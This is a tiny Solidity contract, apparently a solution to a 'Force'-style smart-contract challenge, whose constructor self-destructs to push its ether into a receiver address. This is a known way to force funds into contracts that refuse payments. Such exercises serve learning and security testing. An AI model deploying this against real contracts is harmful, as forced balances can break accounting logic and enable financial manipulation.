// SPDX-License-Identifier: MIT
pragma solidity 0.8.13;

contract ForceChallenge {
    constructor(address payable receiver) payable {
        selfdestruct(receiver);
    }
}
